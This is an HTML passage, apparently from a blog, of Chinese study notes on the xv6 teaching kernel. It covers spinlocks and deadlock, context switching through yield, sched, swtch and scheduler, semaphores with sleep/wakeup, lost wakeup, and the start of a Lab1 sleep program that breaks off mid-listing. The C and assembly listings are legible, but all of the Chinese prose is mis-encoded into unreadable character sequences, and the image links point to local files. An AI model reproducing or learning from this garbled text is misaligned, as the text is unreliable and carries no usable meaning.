<p>éœ€è¦é”çš„ä¸»è¦åŸå› å°±æ˜¯cpuæ˜¯å¤šæ ¸çš„ï¼Œæ¯ä¸ªæ ¸éƒ½å¯èƒ½æœ‰ä¸€ä¸ªç¨‹åºæµï¼Œè¿™äº›ç¨‹åºæµå¯èƒ½è®¿é—®åŒä¸€ä¸ªå…±äº«æ•°æ®ï¼Œå†…æ ¸ä¸­å°±æœ‰å¾ˆå¤šå…¨å±€æ•°æ®ç»“æ„ï¼Œå½“å¤šä¸ªè¿›ç¨‹åœ¨ä¸åŒæ ¸å¿ƒä¸Šè¿è¡Œç„¶ååŒæ—¶è¿›å…¥ç³»ç»Ÿè°ƒç”¨å°±å¯èƒ½å‘ç”ŸåŒæ—¶è®¿é—®å…±äº«æ•°æ®çš„é—®é¢˜ã€‚æ€»è€Œè¨€ä¹‹å°±æ˜¯è§£å†³å¹¶è¡Œæ€§ç³»ç»Ÿä¸­è®¿å­˜å…±äº«æ•°æ®çš„é—®é¢˜ã€‚</p>
<p>é”ä¼šåºåˆ—åŒ–æ“ä½œï¼Œå³å¯ä»¥æ§åˆ¶å¹¶è¡Œç³»ç»Ÿå…³äºåŒä¸€ä¸ªå…±äº«æ•°æ®çš„è®¿é—®é¡ºåºï¼Œé€šä¸€ä¸ªæ—¶åˆ»å†…ï¼Œåªæœ‰ä¸€ä¸ªæ ¸å¯ä»¥è®¿é—®å…±äº«æ•°æ®æ®µï¼Œå½“ç„¶ï¼Œè¿™åŠ¿å¿…ä¼šé€ æˆæ€§èƒ½æŸå¤±ã€‚</p>
<p>æ¯”å¦‚freelistå°±å¯èƒ½é€ æˆæ¡ä»¶ç«äº‰ã€‚</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20221010104133931.png" alt="image-20221010104133931"></p>
<p>åœ¨xv6ä¸­å…³äºé”ä¸»è¦æœ‰ä¸¤ä¸ªå‡½æ•°è°ƒç”¨<code>acquire()</code>å’Œ<code>release()</code>ï¼Œç¬¬ä¸€ä¸ªå‡½æ•°æ˜¯è·å¾—é”ï¼Œç¬¬äºŒä¸ªå‡½æ•°æ˜¯é‡Šæ”¾é”ã€‚</p>
<p>é”å¯ä»¥æœ‰ç²—ç²’åº¦é”å’Œç»†ç²’åº¦é”</p>
<p>é”å¯ä»¥è§£å†³æ¡ä»¶ç«äº‰çš„é—®é¢˜ï¼Œä½†æ˜¯ä¹Ÿä¼šå¸¦æ¥è‡ªå·±çš„é—®é¢˜ï¼Œä¹Ÿå°±æ˜¯ä¼—æ‰€å‘¨çŸ¥çš„æ­»é”é—®é¢˜ã€‚</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20221011001902538.png" alt="image-20221011001902538"></p>
<p>åŠ é”è¿™ä¸ªè¿‡ç¨‹å¿…é¡»æ˜¯åŸå­åºåˆ—çš„ï¼Œåœ¨xv6ä¸­ï¼Œä½¿ç”¨çš„æ˜¯amoswapæŒ‡ä»¤å®ŒæˆåŠ é”ï¼ŒåŸç†å°±æ˜¯amoswapä¼šå¯¹addrè¿™ä¸ªåœ°å€åŠ é”ï¼Œç„¶åæ‰§è¡Œå®Œåé¢ä¸‰ä¸ªåå†è§£é”ï¼Œæœ€ååˆ¤æ–­r2çš„å€¼æ¥åˆ¤æ–­æ˜¯å¦è·å¾—é”äº†ã€‚å¦‚æœç­‰äº0å°±æ˜¯è·å¾—é”ï¼Œå¦‚æœç­‰äº1å°±æ˜¯æ²¡æœ‰è·å¾—é”ï¼Œç§’å•Šã€‚</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20221011010830326.png" alt="image-20221011010830326"></p>
<p>è€å¸ˆæåˆ°çš„ä¸€ä¸ªè§£å†³æ­»é”é—®é¢˜çš„åŠæ³•æ˜¯æŠŠæ‰€æœ‰é”è¿›è¡Œä¸€ä¸ªæ’åºï¼Œç„¶åè¿›ç¨‹è·å¾—å¤šä¸ªé”çš„æ—¶å€™å°±æŒ‰ç…§è¿™ä¸ªé¡ºåºæ¥è·å–ï¼Œè¿™æ ·ç¡®å®å¯ä»¥é¿å…æ¯”è¾ƒå…¸å‹çš„æ­»é”é—®é¢˜ã€‚ä½†æ˜¯æ’åºé—®é¢˜ä¼¼ä¹ä¹Ÿå¾ˆéº»çƒ¦ï¼Œéœ€è¦ä¸€ä¸ªå¥½çš„ç­–ç•¥ã€‚</p>
<p>é”å¯¹æ€§èƒ½è‚¯å®šä¼šé€ æˆæŸå¤±ï¼Œè¦æƒ³å°½å¯èƒ½ä¸é€ æˆæŸå¤±ï¼Œåªèƒ½å°½å¯èƒ½å¯¹æŠŠå…±äº«æ•°æ®ç»“æ„ç»†åŒ–ï¼Œç„¶åé”å°±èƒ½å°½å¯èƒ½çš„ç»†ç²’åº¦ï¼Œæ€§èƒ½å°±èƒ½æŸå¤±çš„å°½å¯èƒ½å°‘ï¼Œä½†æ˜¯è¿™æ˜¯éå¸¸å¤æ‚çš„ï¼Œç³»ç»Ÿè¶Šå¤§è¶Šä¸å¥½å®ç°ï¼Œè€å¸ˆç»™å‡ºçš„è§‚ç‚¹æ˜¯å…ˆä½¿ç”¨ç²—ç²’åº¦çš„é”ï¼Œç„¶åçœ‹æœ‰æ²¡æœ‰æ¡ä»¶ç«äº‰ï¼Œå†ç»†åŒ–é”ã€‚</p>
<p>æ‰€æœ‰æ ¸å¿ƒæƒ³è¦è¿›è¡Œå†…å­˜æ“ä½œéƒ½ä¼šç»è¿‡ä¸€ä¸ªå†…å­˜æ§åˆ¶å™¨ï¼Œç¡¬ä»¶é”å°±æ˜¯åˆ©ç”¨æ­¤å®Œæˆå¯¹ç‰¹å®šåœ°å€åŠ é”ï¼Œè®©æ‰§è¡Œå‡ æ­¥æ“ä½œåå¯¹æ­¤è§£é”ã€‚</p>
<h4 id="Lecture11"><a href="#Lecture11" class="headerlink" title="Lecture11"></a>Lecture11</h4><h5 id="book-read-1"><a href="#book-read-1" class="headerlink" title="book-read"></a>book-read</h5><p><strong>ä¸Šä¸‹æ–‡åˆ‡æ¢</strong></p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20221011163736314.png" alt="image-20221011163736314"></p>
<p>æ¯ä¸ªcpuéƒ½æœ‰è‡ªå·±çš„è°ƒåº¦ç¨‹åºçº¿ç¨‹ä»¥åŠè°ƒåº¦ç¨‹åºæ ˆï¼Œå…¶ä¸Šä¸‹æ–‡ä¿å­˜åœ¨cpu-&gt;contextä¸­ï¼Œå½“shellè¿›ç¨‹åˆ‡æ¢åˆ°catè¿›ç¨‹çš„æ—¶å€™ï¼Œé¦–å…ˆåœ¨shellçš„å†…æ ¸çº¿ç¨‹ä¸­è°ƒç”¨<code>yield()</code>å‡½æ•°</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">yield</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line">  acquire(&amp;p-&gt;lock);</span><br><span class="line">  p-&gt;state = RUNNABLE;</span><br><span class="line">  sched();</span><br><span class="line">  release(&amp;p-&gt;lock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…ˆæŠŠå½“å‰è¿›ç¨‹çš„çŠ¶æ€ä½æ”¹æˆ<code>RUNNABLE</code>,ç„¶åè°ƒç”¨<code>sched()</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">sched</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> intena;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!holding(&amp;p-&gt;lock))</span><br><span class="line">    panic(<span class="string">&quot;sched p-&gt;lock&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(mycpu()-&gt;noff != <span class="number">1</span>)</span><br><span class="line">    panic(<span class="string">&quot;sched locks&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(p-&gt;state == RUNNING)</span><br><span class="line">    panic(<span class="string">&quot;sched running&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(intr_get())</span><br><span class="line">    panic(<span class="string">&quot;sched interruptible&quot;</span>);</span><br><span class="line"></span><br><span class="line">  intena = mycpu()-&gt;intena;</span><br><span class="line">  swtch(&amp;p-&gt;context, &amp;mycpu()-&gt;context);</span><br><span class="line">  mycpu()-&gt;intena = intena;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸»è¦å°±æ˜¯è°ƒç”¨äº†<code>swtch()</code>å‡½æ•°æ¥ä¿å­˜ä¸Šä¸‹æ–‡å¹¶æ¢å¤è°ƒåº¦çº¿ç¨‹ä¸Šä¸‹æ–‡ï¼Œæ‰§è¡Œè°ƒåº¦çº¿ç¨‹ã€‚</p>
<p>swtchä¸­ä¸»è¦å°±æ˜¯sdå’Œld,å½“æœ€åæ‰§è¡Œretçš„æ—¶å€™å°±è¿”å›åˆ°äº†è°ƒåº¦ç¨‹åºçº¿ç¨‹ä¸Šä¸‹æ–‡äº†ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">000000008000267a &lt;swtch&gt;:</span><br><span class="line">    8000267a:	00153023          	sd	ra,0(a0)</span><br><span class="line">    8000267e:	00253423          	sd	sp,8(a0)</span><br><span class="line">    80002682:	e900                	sd	s0,16(a0)</span><br><span class="line">    80002684:	ed04                	sd	s1,24(a0)</span><br><span class="line">    80002686:	03253023          	sd	s2,32(a0)</span><br><span class="line">    8000268a:	03353423          	sd	s3,40(a0)</span><br><span class="line">    8000268e:	03453823          	sd	s4,48(a0)</span><br><span class="line">    80002692:	03553c23          	sd	s5,56(a0)</span><br><span class="line">    80002696:	05653023          	sd	s6,64(a0)</span><br><span class="line">    8000269a:	05753423          	sd	s7,72(a0)</span><br><span class="line">    8000269e:	05853823          	sd	s8,80(a0)</span><br><span class="line">    800026a2:	05953c23          	sd	s9,88(a0)</span><br><span class="line">    800026a6:	07a53023          	sd	s10,96(a0)</span><br><span class="line">    800026aa:	07b53423          	sd	s11,104(a0)</span><br><span class="line">    800026ae:	0005b083          	ld	ra,0(a1)</span><br><span class="line">    800026b2:	0085b103          	ld	sp,8(a1)</span><br><span class="line">    800026b6:	6980                	ld	s0,16(a1)</span><br><span class="line">    800026b8:	6d84                	ld	s1,24(a1)</span><br><span class="line">    800026ba:	0205b903          	ld	s2,32(a1)</span><br><span class="line">    800026be:	0285b983          	ld	s3,40(a1)</span><br><span class="line">    800026c2:	0305ba03          	ld	s4,48(a1)</span><br><span class="line">    800026c6:	0385ba83          	ld	s5,56(a1)</span><br><span class="line">    800026ca:	0405bb03          	ld	s6,64(a1)</span><br><span class="line">    800026ce:	0485bb83          	ld	s7,72(a1)</span><br><span class="line">    800026d2:	0505bc03          	ld	s8,80(a1)</span><br><span class="line">    800026d6:	0585bc83          	ld	s9,88(a1)</span><br><span class="line">    800026da:	0605bd03          	ld	s10,96(a1)</span><br><span class="line">    800026de:	0685bd83          	ld	s11,104(a1)</span><br><span class="line">    800026e2:	8082                	ret</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªæ˜¯<code>scheduler</code>å‡½æ•°ï¼Œåˆ‡æ¢ä¸Šä¸‹æ–‡åï¼Œå°±ä¼šæ‰§è¡Œ<code>swtch</code>çš„ä¸‹ä¸€æ¡è¯­å¥äº†ï¼Œæ¯”è¾ƒé¥¶çš„å°±æ˜¯è·å¾—é”å’Œé‡Šæ”¾é”åº”è¯¥æ˜¯ä¸€ä¸ªè¿›ç¨‹å¹²çš„äº‹æƒ…ï¼Œä½†æ˜¯åœ¨è°ƒåº¦çš„æ—¶å€™å¹¶ä¸æ˜¯è¿™æ ·ï¼Œé¦–å…ˆåœ¨<code>yield</code>ä¸­è·å¾—é”ï¼Œç„¶ååœ¨<code>scheduler</code>é‡Šæ”¾é”ï¼Œç›®çš„ä¿æŠ¤è¿›ç¨‹ä¸è¢«å…¶ä»–cpuè°ƒåº¦ã€‚çœ‹ä¼¼å½¢ä¸æˆä¸€ä¸ªé—­ç¯ï¼Œä½†å…¶å®æ˜¯å¯ä»¥çš„ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">scheduler</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">cpu</span> *<span class="title">c</span> =</span> mycpu();</span><br><span class="line">  </span><br><span class="line">  c-&gt;proc = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">    <span class="comment">// Avoid deadlock by ensuring that devices can interrupt.</span></span><br><span class="line">    intr_on();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> nproc = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(p = proc; p &lt; &amp;proc[NPROC]; p++) &#123;</span><br><span class="line">      acquire(&amp;p-&gt;lock);</span><br><span class="line">      <span class="keyword">if</span>(p-&gt;state != UNUSED) &#123;</span><br><span class="line">        nproc++;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span>(p-&gt;state == RUNNABLE) &#123;</span><br><span class="line">        <span class="comment">// Switch to chosen process.  It is the process&#x27;s job</span></span><br><span class="line">        <span class="comment">// to release its lock and then reacquire it</span></span><br><span class="line">        <span class="comment">// before jumping back to us.</span></span><br><span class="line">        p-&gt;state = RUNNING;</span><br><span class="line">        c-&gt;proc = p;</span><br><span class="line">        swtch(&amp;c-&gt;context, &amp;p-&gt;context);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Process is done running for now.</span></span><br><span class="line">        <span class="comment">// It should have changed its p-&gt;state before coming back.</span></span><br><span class="line">        c-&gt;proc = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      release(&amp;p-&gt;lock);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(nproc &lt;= <span class="number">2</span>) &#123;   <span class="comment">// only init and sh exist</span></span><br><span class="line">      intr_on();</span><br><span class="line">      <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span><span class="params">(<span class="string">&quot;wfi&quot;</span>)</span></span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>xv6ä¸ºæ¯ä¸ªcpuå‡†å¤‡äº†ä¸€ä¸ª<code>struct cpu</code>,è¿™ä¸ªç»“æ„ä½“é‡Œå°±ä¼šè®°å½•ç€è¿™ä¸ªcpuå½“å‰è¿è¡Œçš„<code>proc</code>ç­‰ç­‰ï¼Œæ‰€æœ‰çš„<code>struct cpu</code>ä¿å­˜åœ¨ä¸€ä¸ªæ•°ç»„é‡Œï¼Œåˆ©ç”¨å½“å‰cpuçš„<code>tp</code>å¯„å­˜å™¨çš„å€¼è¿›è¡Œç´¢å¼•ã€‚</p>
<p><strong>sleep/wakeup</strong></p>
<p>ç”Ÿäº§è€…æ˜¯ä¸€ä¸ªçº¿ç¨‹ï¼Œæ¶ˆè´¹è€…æ˜¯ä¸€ä¸ªçº¿ç¨‹ï¼Œä¸¤ä¸ªçº¿ç¨‹ä¹‹é—´å¾—éœ€è¦ä¸€ä¸ªåŒæ­¥æœºåˆ¶æ¥åè°ƒï¼Œæ¯”å¦‚ç”Ÿäº§è€…ç”Ÿäº§ä¸€ä¸ªäº§å“ï¼Œæ¶ˆè´¹è€…æ‰èƒ½æ¶ˆè´¹ä¸€ä¸ª</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">semaphore</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">lock</span>;</span></span><br><span class="line">    <span class="keyword">int</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">V</span><span class="params">(struct semaphore* s)</span> </span>&#123;</span><br><span class="line">    acquire(&amp;s-&gt;lock);</span><br><span class="line">    s-&gt;count += <span class="number">1</span>;</span><br><span class="line">    release(&amp;s-&gt;lock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">P</span><span class="params">(struct semaphore* s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (s-&gt;count == <span class="number">0</span>)</span><br><span class="line">        ;</span><br><span class="line">    acquire(&amp;s-&gt;lock);</span><br><span class="line">    s-&gt;count -= <span class="number">1</span>;</span><br><span class="line">    release(&amp;s-&gt;lock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªä»£ç æ²¡é—®é¢˜ï¼Œä½†æ˜¯å¯¹äºæ¶ˆè´¹è€…æ¥è¯´ï¼Œå¦‚æœç”Ÿäº§è€…æ²¡æœ‰ç”Ÿäº§çš„è¯ï¼Œé‚£å°±å¾—ä¸€ç›´è‡ªæ—‹ï¼Œååˆ†æµªè´¹cpuèµ„æºï¼Œå½“å¼•è¿›åŒæ­¥æœºåˆ¶å</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">V</span><span class="params">(struct semaphore* s)</span> </span>&#123;</span><br><span class="line">    acquire(&amp;s-&gt;lock);</span><br><span class="line">    s-&gt;count += <span class="number">1</span>;</span><br><span class="line">    wakeup(s);</span><br><span class="line">    release(&amp;s-&gt;lock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">P</span><span class="params">(struct semaphore* s)</span> </span>&#123;</span><br><span class="line">    acquire(&amp;s-&gt;lock);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (s-&gt;count == <span class="number">0</span>)</span><br><span class="line">        sleep(s, &amp;s-&gt;lock);  <span class="comment">// !pay attention</span></span><br><span class="line">    s-&gt;count -= <span class="number">1</span>;</span><br><span class="line">    release(&amp;s-&gt;lock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å³è€ƒè™‘äº†cpuèµ„æºè¿˜è€ƒè™‘äº†æ¡ä»¶ç«äº‰ã€‚</p>
<p><code>pipe</code>å°±æ˜¯åˆ©ç”¨é”å’Œ<code>sleep/wakeup</code>å®ç°çš„ï¼Œ<code>exit/wait</code>ä¹Ÿæ˜¯ã€‚</p>
<p>æ€»è€Œè¨€ä¹‹ï¼Œé”è¿™å—åŸç†ä¸ç»•ï¼Œä½†æ˜¯ä½¿ç”¨èµ·æ¥å¥½ç»•å•Šã€‚</p>
<h5 id="è¯¾ç¨‹å†…å®¹-1"><a href="#è¯¾ç¨‹å†…å®¹-1" class="headerlink" title="è¯¾ç¨‹å†…å®¹"></a>è¯¾ç¨‹å†…å®¹</h5><p>ä¸»è¦è®²è§£thread switch</p>
<p>ç»ˆäºçŸ¥é“äº†å®šæ—¶å™¨ä¸­æ–­æ˜¯ä¸ªä»€ä¹ˆè‘£ç†Šäº†ï¼Œæ¯ä¸ªæ ¸å¿ƒéƒ½æœ‰ä¸€ä¸ªå®šæ—¶å™¨ï¼Œè¿™ä¸ªå®šæ—¶å™¨å‘¨æœŸæ€§çš„å‘å‡ºä¸€äº›ä¸­æ–­ï¼Œè¿™äº›ä¸­æ–­å°±æ˜¯å®šæ—¶å™¨ä¸­æ–­ï¼Œæ‰€ä»¥å°±ç®—ç¨‹åºæ²¡æœ‰ä¸»åŠ¨é™·å…¥å†…æ ¸ï¼Œåœ¨å®šæ—¶å™¨å‘ç”Ÿçš„æ—¶å€™è¿˜æ˜¯ä¼šé™·å…¥ï¼Œæ­¤æ—¶å°±å¯ä»¥è®°å½•ç¨‹åºè¿è¡Œæ—¶é•¿å’Œæ˜¯å¦åˆ‡æ¢ç¨‹åºçš„å·¥ä½œäº†ã€‚</p>
<p>åœ¨å‘ç”Ÿè®¡æ—¶å™¨ä¸­æ–­çš„æ—¶å€™ï¼Œå†…æ ¸å¤„ç†ç¨‹åºå°±å¯ä»¥è®©å‡ºcpuç»™è°ƒåº¦å™¨ï¼Œç„¶åè°ƒåº¦å™¨åˆ‡æ¢çº¿ç¨‹ï¼Œåœ¨xv6ä¸­ï¼Œè®©å‡ºé çš„æ˜¯yields()å‡½æ•°ã€‚</p>
<p>è¿›ç¨‹ä¹‹é—´çš„åˆ‡æ¢å¹¶ä¸æ˜¯ä»è¿™ä¸ªè¿›ç¨‹çš„ç›´æ¥åˆ‡æ¢åˆ°å¦ä¸€ä¸ªè¿›ç¨‹çš„ï¼Œè€Œæ˜¯ä»è¿™ä¸ªè¿›ç¨‹çš„å†…æ ¸çº¿ç¨‹ï¼ˆçº¿ç¨‹1ï¼‰ä¸­åˆ‡æ¢åˆ°å¦ä¸€ä¸ªè¿›ç¨‹çš„å†…æ ¸çº¿ç¨‹ï¼ˆçº¿ç¨‹2ï¼‰ä¸­ï¼Œç„¶ååœ¨çº¿ç¨‹2ä¸­å†è‡ªç„¶è¿”å›åˆ°å¯¹åº”è¿›ç¨‹ä¸­ï¼ˆè¿›ç¨‹2ï¼‰ã€‚</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20221011154315913.png" alt="image-20221011154315913"></p>
<h4 id="Lecture13"><a href="#Lecture13" class="headerlink" title="Lecture13"></a>Lecture13</h4><p>è¿™èŠ‚è¯¾ä¸»è¦è®²è§£äº†sleepå’Œwakeupï¼Œè¿™æ˜¯ä¸€ç§å¸¸è§çš„åè°ƒæœºåˆ¶ã€‚</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20221020144559437.png" alt="image-20221020144559437"></p>
<p>å½“sleep/wakeupä¸ä½¿ç”¨é”ä½œä¸ºå‚æ•°çš„è¯å®ç°ä¼ªä»£ç å¦‚ä¸Šå›¾ï¼Œå¦‚æœä½¿ç”¨è¿™ç§sleep/wakeupçš„è¯å°±ä¼šé€ æˆä¸¥é‡çš„<code>lost wakeup</code>é—®é¢˜ï¼Œä¾‹å­å¦‚ä¸‹</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20221020150533008.png" alt="image-20221020150533008"> </p>
<p><code>uartwrite</code>é‡Šæ”¾é”ä¹‹åï¼Œä¸­æ–­çº¿ç¨‹å°±å¼€å§‹æ‰§è¡Œäº†ï¼Œå› ä¸ºæ˜¯å¤šæ ¸å¿ƒï¼Œæ‰€ä»¥å°±ä¼šé€ æˆä¸€ç§å±€é¢ï¼Œ<code>wakup</code>æ¯”<code>slepp</code>æå‰æ‰§è¡Œï¼Œå¯¼è‡´sleepçš„çº¿ç¨‹æ²¡æœ‰äººå»å”¤é†’äº†ã€‚è¿™å°±æ˜¯<code>lsot wakeup</code>ã€‚</p>
<p>æˆ‘ä»¥ä¸ºå¤„ç†åŠæ³•æ˜¯è®©é‡Šæ”¾é”å’Œç¡çœ æ˜¯åŸå­çš„å°±å¥½äº†ï¼Œä½†æ˜¯xv6å¹¶ä¸æ˜¯è¿™æ ·å®ç°çš„ï¼Œè€Œæ˜¯ä½¿ç”¨<code>p-&gt;lock</code>ï¼Œè¿™æ ·ä¹Ÿè¾¾åˆ°äº†æ•ˆæœã€‚</p>
<p>è€å¸ˆå¯¹<code>wait</code>å‡½æ•°ä¹Ÿè¿›è¡Œäº†è®²è§£ï¼Œæ‰æ˜ç™½è¿‡æ¥å…¶å®å­è¿›ç¨‹çš„èµ„æºå›æ”¶å¹¶ä¸æ˜¯ç”±å­è¿›ç¨‹è‡ªå·±å®Œæˆçš„ï¼Œè€Œæ˜¯å¯¹è‡ªå·±çŠ¶æ€è¿›è¡Œæ ‡æ³¨ä¸ºå¯ä»¥å›æ”¶ï¼Œç„¶åçˆ¶è¿›ç¨‹è°ƒç”¨wait()çš„æ—¶å€™æ£€æŸ¥å­è¿›ç¨‹ç„¶åå›æ”¶ã€‚ï¼ˆå½“ç„¶ä¸å¯èƒ½è‡ªå·±å›æ”¶è‡ªå·±ï¼‰ã€‚</p>
<h4 id="Lecture14"><a href="#Lecture14" class="headerlink" title="Lecture14"></a>Lecture14</h4><p>è¿™èŠ‚è¯¾ä¸»è¦æ˜¯æ–‡ä»¶ç³»ç»Ÿçš„è®²è§£</p>
<h2 id="LAB"><a href="#LAB" class="headerlink" title="LAB"></a>LAB</h2><h3 id="Lab1-Xv6-and-Unix-utilities"><a href="#Lab1-Xv6-and-Unix-utilities" class="headerlink" title="Lab1: Xv6 and Unix utilities"></a>Lab1: Xv6 and Unix utilities</h3><p>è¿™ä¸ªå®éªŒä¸»è¦æ˜¯ç†Ÿæ‚‰xv6çš„ç³»ç»Ÿè°ƒç”¨æ¥å£çš„ã€‚</p>
<h4 id="sleep"><a href="#sleep" class="headerlink" title="sleep"></a>sleep</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;user/user.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(argc!=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">2</span>,<span class="string">&quot;your parameter is not number\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(atoi(argv[<span class="number">1</span>]));</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span 